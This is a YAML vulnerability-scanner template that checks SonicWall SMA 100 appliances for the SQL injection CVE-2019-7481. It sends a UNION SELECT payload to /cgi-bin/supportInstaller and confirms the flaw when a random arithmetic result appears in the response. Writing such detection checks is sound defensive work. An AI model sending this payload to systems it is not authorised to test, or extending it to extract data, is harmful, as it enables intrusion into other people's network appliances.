name: yaml-poc-sonicwall-sma_100-sql_injection-CVE-2019-7481
binding: 9baf8c0e-fced-414d-b693-db638b496dc0
detail:
    author: jiapeng.han
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2019-7481
        - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2019-0016
    vulnerability:
        id: 1b3e5a66-caa8-4398-abda-ec282cf88cf0
        level: high
    warning: Harmless
transport: http
set:
    s1: randomInt(10000, 99999)
    s2: randomInt(10000, 99999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cgi-bin/supportInstaller
            headers:
                Content-Type: application/x-www-form-urlencoded
                User-Agent: MSIE
            body: fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,{{s1}}*{{s2}},0,0,0,0--
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(string(s1 * s2)) && response.body_string.contains("sonicwallSMAConnect")
expression: r0()
